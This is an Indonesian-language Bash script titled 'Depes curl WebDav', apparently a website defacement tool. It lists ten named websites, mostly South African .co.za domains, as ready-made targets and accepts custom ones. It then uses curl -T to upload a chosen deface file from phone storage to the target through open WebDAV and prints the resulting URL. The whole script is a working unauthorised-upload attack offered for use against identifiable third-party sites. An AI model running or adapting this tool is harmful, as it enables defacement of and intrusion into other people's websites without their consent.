#!/bin/bash
#pembuat Billy
#mau apa mau recode???
#ya elah kodingan simple aja recode-,-
#tapi gak papa deh kalo buat belajar:)
#maap kalo ada keslahan yah,nanti insyaallah akan diperbaiki terus kok

clear
#variable
c="          ================================================="
k="================================================="
figlet "                          Billy"|lolcat
echo " "
echo "$c"|lolcat
echo "                          Depes curl WebDav"|lolcat
echo "$c"|lolcat
echo "                           Pembuat Billy"|lolcat
echo "$c"|lolcat
echo "                   mau nanya2 hubungi 0858-37-173009"|lolcat
echo "$c"|lolcat
echo "                           thanx for Diriku"|lolcat
echo " "
echo " "
echo "                           pilihan website"|lolcat
echo ""
echo "1. http://bitsandpieces.co.za"
echo "$k"
echo "2. http://scnc.co.za"
echo "$k"
echo "3. http://control.co.za"
echo $k
echo "4. http://ayk.co.za"
echo $k
echo "5. http://colourfactory.co.za"
echo $k
echo "6. http://floralandfresh.co.za"
echo $k
echo "7. http://handj.co.za"
echo $k
echo "8. http://mestern.co.za"
echo $k
echo "9. http://8x8.co.za"
echo $k
echo "10. http://montdestin.com"
echo $k
echo "99. Punya target sendiri"
echo $k
echo "00. gak jadi deh gada kuota:("
echo $k
echo " "
trap ctrl_c INT
ctrl_c()
{
echo "ditunggu ya tool versi berikut"|lolcat
figlet "selamatjalan"|lolcat
sleep 1
exit
}
read -p "Silahkan Pilih websitenya ==> " cc
read -p "script depesnya?? ==> " kk
if [ $cc = 1 ] || [ $cc = 1 ]
then
curl -T /storage/emulated/0/$kk http://bitsandpieces.co.za
echo "udah cok http://bitsandpieces.co.za/$kk"|lolcat
fi
if [ $cc = 2 ] || [ $cc = 2 ]
then
curl -T /storage/emulated/0/$kk http://scnc.co.za
echo "udah cok http://scnc.co.za/$kk"|lolcat
fi
if [ $cc = 3 ] || [ $cc = 3 ]
then
curl -T /storage/emulated/0/$kk http://control.co.za
echo "udah cok http://control.co.za/$kk"|lolcat
fi
if [ $cc = 4 ] || [ $cc = 4 ]
then
curl -T /storage/emulated/0/$kk http://ayk.co.za
echo "udah cok http://ayk.co.za/$kk"|lolcat
fi
if [ $cc = 5 ] || [ $cc = 5 ]
then
curl -T /storage/emulated/0/$kk http://colourfactory.co.za
echo "udah cok http://colourfactory.co.za/$kk"|lolcat
fi
if [ $cc = 6 ] || [ $cc = 6 ]
then
curl -T /storage/emulated/0/$kk http://floralandfresh.co.za
echo "udah cok http://floralandfresh.co.za/$kk"|lolcat
fi
if [ $cc = 7 ] || [ $cc = 7 ]
then
curl -T /storage/emulated/0/$kk http://handj.co.za
echo "udah cok http://handj.co.za/$kk"|lolcat
fi
if [ $cc = 8 ] || [ $cc = 8 ]
then
curl -T /storage/emulated/0/$kk http://mestern.co.za
echo "udah cok http://mestern.co.za/$kk"|lolcat
fi
if [ $cc = 9 ] || [ $cc = 9 ]
then
curl -T /storage/emulated/0/$kk http://8x8.co.za
echo "udah cok http://8x8.co.za/$kk"|lolcat
fi
if [ $cc = 10 ] || [ $cc = 10 ]
then
curl -T /storage/emulated/0/$kk http://montdestin.com
echo "udah cok http://montdestin.com/$kk"|lolcat
fi
if [ $cc = 99 ] || [ $cc = 99 ]
then
read -p "Masukan Targetnya: " dua
fi
if [ $cc = 00 ] || [ $cc = 00 ]
then
echo "maknya bos jangan banyak liat vokep:v" |lolcat
echo "makasih ya sudah gunakan tools ini"|lolcat
echo "mau nanya2 silahkan wa ke nomor diatas"|lolcat
exit
fi
if [ $dua ]
then
curl -T /storage/emulated/0/$kk $dua
echo "udah cok $dua/$kk"|lolcat
fi
